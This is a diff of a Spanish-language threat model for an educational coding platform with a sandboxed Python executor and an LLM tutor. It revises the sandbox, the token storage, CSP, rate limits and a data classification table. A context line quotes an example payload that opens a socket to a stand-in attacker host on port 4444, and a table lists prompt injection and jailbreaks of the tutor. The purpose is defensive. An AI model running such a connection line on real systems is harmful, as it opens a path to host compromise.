@@ -91,7 +91,7 @@ __import__('socket').connect(('attacker.com', 4444))
 **Impacto**: compromiso del host si no hay sandboxing.
 
 **Mitigación aplicada**:
-- **Dev**: `subprocess.run()` con `timeout=10s` y `resource` limits via preexec_fn
+- **Dev**: `asyncio.create_subprocess_exec()` con `timeout=10s` y `resource` limits via preexec_fn. **NUNCA** `subprocess.run()` en código async — bloquea el event loop.
 - **Prod**: Docker container con `seccomp` profile restrictivo, sin root, sin red, `/tmp` como único filesystem escribible
 - Whitelist de módulos permitidos (los del curriculum del curso)
 
@@ -139,8 +139,8 @@ Vulnerabilidades de escape de Docker (e.g., CVE en runc).
 ### 3.2 Configuración del sandbox en desarrollo
 
 ```python
-# app/services/sandbox/executor.py
-import subprocess
+# app/features/sandbox/executor.py
+import asyncio
 import resource
 import os
 import sys
@@ -169,6 +169,10 @@ def set_resource_limits():
     resource.setrlimit(resource.RLIMIT_FSIZE, (1024 * 1024, 1024 * 1024))
 
 async def execute_code(code: str) -> dict:
+    """
+    Ejecuta código Python en un subproceso aislado de forma ASYNC.
+    CRÍTICO: usar asyncio.create_subprocess_exec() — subprocess.run() bloquea el event loop.
+    """
     with tempfile.NamedTemporaryFile(
         mode="w", suffix=".py", dir="/tmp", delete=False
     ) as f:
@@ -176,23 +180,30 @@ async def execute_code(code: str) -> dict:
         tmp_path = f.name
 
     try:
-        result = subprocess.run(
-            [sys.executable, tmp_path],
-            capture_output=True,
-            text=True,
-            timeout=SANDBOX_TIMEOUT,
-            preexec_fn=set_resource_limits,
+        # asyncio.create_subprocess_exec() es non-blocking — no bloquea el event loop
+        proc = await asyncio.create_subprocess_exec(
+            sys.executable, tmp_path,
+            stdout=asyncio.subprocess.PIPE,
+            stderr=asyncio.subprocess.PIPE,
             env={"PATH": "/usr/bin:/bin", "TMPDIR": "/tmp"},
             cwd="/tmp",
+            preexec_fn=set_resource_limits,
         )
-        return {
-            "stdout": result.stdout[:10_000],   # max 10KB de output
-            "stderr": result.stderr[:2_000],
-            "exit_code": result.returncode,
-            "timed_out": False,
-        }
-    except subprocess.TimeoutExpired:
-        return {"stdout": "", "stderr": "Tiempo de ejecución excedido (10s)", "exit_code": -1, "timed_out": True}
+        try:
+            stdout_bytes, stderr_bytes = await asyncio.wait_for(
+                proc.communicate(),
+                timeout=SANDBOX_TIMEOUT,
+            )
+            return {
+                "stdout": stdout_bytes.decode("utf-8", errors="replace")[:10_000],
+                "stderr": stderr_bytes.decode("utf-8", errors="replace")[:2_000],
+                "exit_code": proc.returncode,
+                "timed_out": False,
+            }
+        except asyncio.TimeoutError:
+            proc.kill()
+            await proc.wait()
+            return {"stdout": "", "stderr": "Tiempo de ejecución excedido (10s)", "exit_code": -1, "timed_out": True}
     finally:
         os.unlink(tmp_path)
 ```
@@ -245,7 +256,7 @@ El system prompt incluye reglas explícitas:
 Toda respuesta del LLM pasa por un pipeline de validación antes de enviarse al cliente:
 
 ```python
-# app/services/tutor/post_processor.py
+# app/features/tutor/post_processor.py
 from dataclasses import dataclass
 from typing import Protocol
 import re
@@ -259,7 +270,8 @@ class SolutionLeakCheck:
     """Detecta si la respuesta contiene una solución directa al ejercicio."""
     SOLUTION_PATTERNS = [
         r"def\s+\w+\s*\(.*\):\s*\n\s+(?:return|for|if|while)",  # función completa
-        r"```python[\s\S]+?```",  # bloque de código Python sustancial
+        # Bloque de código con MÁS de 5 líneas — permite snippets cortos (≤5 líneas) para guía pedagógica
+        r"```(?:python|javascript|java|c\+\+)?\n(?:.*\n){6,}```",
         r"la solución (?:es|completa|final)",
         r"aquí (?:está|va) el código",
     ]
@@ -404,7 +416,8 @@ class UserCreate(BaseModel):
     email: EmailStr
     password: str
     full_name: str
-    # "role" NO está aquí — se asigna server-side
+    # "role" NO está aquí — se asigna server-side con default "alumno"
+    # Solo un admin puede cambiar roles via POST /admin/users/{id}/role
 
 class UserResponse(BaseModel):
     id: UUID
@@ -469,11 +482,13 @@ Un cliente conectado por WS envía 1000 mensajes en segundos.
 ```python
 async def handle_tutor_message(data: dict, user_payload: dict, ws: WebSocket):
     user_id = user_payload["sub"]
+    exercise_id = data.get("exercise_id", "default")
 
     # Verificar rate limit ANTES de llamar al LLM
+    # Clave canónica: rl:tutor:{user_id}:{exercise_id} — 30 msg/hora por alumno por ejercicio
     limiter = SlidingWindowRateLimiter(redis_client)
     try:
-        await limiter.check(f"rl:tutor:{user_id}", limit=30, window_seconds=3600)
+        await limiter.check(f"rl:tutor:{user_id}:{exercise_id}", limit=30, window_seconds=3600)
     except HTTPException:
         await ws.send_json({
             "type": "error",
@@ -530,7 +545,7 @@ Cambiar el orden de eventos para falsificar una secuencia de aprendizaje.
 ### 7.2 Implementación del hash chain
 
 ```python
-# app/services/ctr/chain.py
+# app/features/cognitive/chain.py
 import hashlib
 import json
 from datetime import datetime, timezone
@@ -584,18 +599,19 @@ Si la respuesta del tutor LLM contiene HTML/JavaScript y se renderiza sin escapa
 Un sitio malicioso hace requests a la API en nombre del usuario autenticado.
 
 **Mitigación**:
-- La API usa `Authorization: Bearer <token>` en el header, no cookies
-- Los headers customizados no pueden ser enviados desde cross-origin sin preflight CORS
-- CORS restrictivo (solo `localhost:5173` y el dominio del frontend en prod)
+- El access token usa `Authorization: Bearer <token>` en el header — los headers customizados no pueden ser enviados desde cross-origin sin preflight CORS.
+- El refresh token está en cookie `SameSite=Strict` — el browser solo la envía en requests al mismo site, bloqueando CSRF de origen externo.
+- CORS restrictivo (solo `localhost:5173` en dev y el dominio HTTPS del frontend en prod).
 
-Por lo tanto, CSRF no aplica en el diseño actual (token en header, no cookie). Si en el futuro se migra a cookies httpOnly, se deberá implementar CSRF tokens (double submit cookie pattern).
+El endpoint `/api/v1/auth/refresh` solo acepta la cookie (no body), y con `SameSite=Strict` un sitio externo no puede forzar al browser a enviarla. **No se requiere CSRF token adicional** bajo este esquema.
 
 #### A8.3 — Robo de tokens del localStorage
 Si hay una vulnerabilidad XSS, el atacante puede leer `localStorage` donde se almacenan los tokens.
 
-**Mitigación actual**: los tokens se almacenan en memoria del store Zustand (no en localStorage ni sessionStorage). Al recargar la página, el usuario debe hacer refresh del token vía cookie httpOnly o re-login.
-
-**Alternativa más segura (futuro)**: migrar a cookies httpOnly para el refresh token, eliminando la superficie de ataque de JavaScript.
+**Mitigación aplicada** (decisión canónica):
+- **Access token**: almacenado en memoria de Zustand (no en `localStorage` ni `sessionStorage`). Un script XSS no puede leerlo desde el DOM, solo desde el scope de React si ya está comprometido.
+- **Refresh token**: en cookie `httpOnly; Secure; SameSite=Strict`. JavaScript no puede leerlo en absoluto.
+- Al recargar la página, el browser envía automáticamente la cookie al endpoint `/api/v1/auth/refresh`, que devuelve un nuevo access token. El usuario nunca necesita re-login a menos que el refresh token expire o sea invalidado.
 
 #### A8.4 — Token en query string del WebSocket
 El token JWT viaja en la URL del WS connection (`?token=...`) y puede aparecer en logs del browser o del servidor.
@@ -608,9 +624,9 @@ El token JWT viaja en la URL del WS connection (`?token=...`) y puede aparecer e
 ### 8.2 Content Security Policy (CSP)
 
 La CSP del backend restringe qué puede ejecutar el browser:
-- `script-src 'self'` — solo scripts del mismo origen
-- `connect-src 'self' ws:` — solo conexiones al mismo origen
-- No se permite `eval()` ni scripts inline (excepto excepciones controladas para Monaco Editor)
+- `script-src 'self' 'wasm-unsafe-eval'` — solo scripts del mismo origen. `'wasm-unsafe-eval'` requerido para Monaco Editor (WASM workers). **NO** `'unsafe-inline'`.
+- `connect-src 'self' wss:` — solo conexiones al mismo origen y WebSocket sobre TLS (WSS). **NO** `ws://` en producción.
+- No se permite `eval()` ni scripts inline en producción.
 
 ---
 
@@ -620,20 +636,20 @@ La CSP del backend restringe qué puede ejecutar el browser:
 
 | Dato | Dónde vive | Protección |
 |------|-----------|------------|
-| Hash de contraseña | `users.accounts.password_hash` | bcrypt, nunca expuesto en API |
+| Hash de contraseña | `operational.users.password_hash` (VARCHAR 128) | bcrypt, nunca expuesto en API |
 | `SECRET_KEY` JWT | Variables de entorno | Fuera del repo, Docker secrets en prod |
 | `ANTHROPIC_API_KEY` | Variables de entorno | Fuera del repo, Docker secrets en prod |
 | Credenciales de DB | Variables de entorno | Fuera del repo |
-| Refresh tokens | Redis `auth:refresh:{jti}` | TTL 7d, cifrado en tránsito |
+| Refresh tokens | Redis `auth:refresh:{jti}` + cookie httpOnly | TTL 7d, JavaScript no puede leerlo |
 
 ### 9.2 Datos sensibles (privacidad académica)
 
 | Dato | Dónde vive | Protección |
 |------|-----------|------------|
-| Historial de conversaciones con el tutor | `tutor.sessions`, `tutor.messages` | Solo visible por el propio alumno, docente del curso, admin |
-| CTR events (registro de errores, tiempos de respuesta) | `ctr.events` | Solo visible por el propio alumno y admin |
+| Historial de conversaciones con el tutor | `operational.tutor_interactions` | Solo visible por el propio alumno, docente de su comisión (read-only), admin |
+| CTR events (registro de errores, tiempos de respuesta) | `cognitive.cognitive_events` | Solo visible por el propio alumno y admin |
 | Métricas de aprendizaje individual | `analytics.student_metrics` | Solo visible por el alumno y docente a cargo |
-| Email del estudiante | `users.accounts` | No expuesto en endpoints públicos |
+| Email del estudiante | `operational.users` | No expuesto en endpoints públicos |
 
 ### 9.3 Datos no sensibles (operacionales)
 
@@ -715,7 +731,7 @@ Cada violación se registra en el log estructurado con:
 | Exfiltración de env vars | Sandbox | Env limpio + filesystem aislado | Implementado |
 | Prompt injection | Tutor LLM | System prompt defensivo + post-processor | Implementado |
 | Jailbreak | Tutor LLM | 20+ adversarial tests en post-processor | Implementado |
-| Token abuse (costo API) | Tutor LLM | Rate limit 30msg/hora por usuario | Implementado |
+| Token abuse (costo API) | Tutor LLM | Rate limit 30msg/hora por usuario por ejercicio | Implementado |
 | Auth bypass | API REST | JWT HS256 + verificación en cada request | Implementado |
 | IDOR | API REST | Ownership check + RBAC en todos los endpoints sensibles | Implementado |
 | SQL Injection | API REST | SQLAlchemy ORM + queries parametrizadas | Estructural |
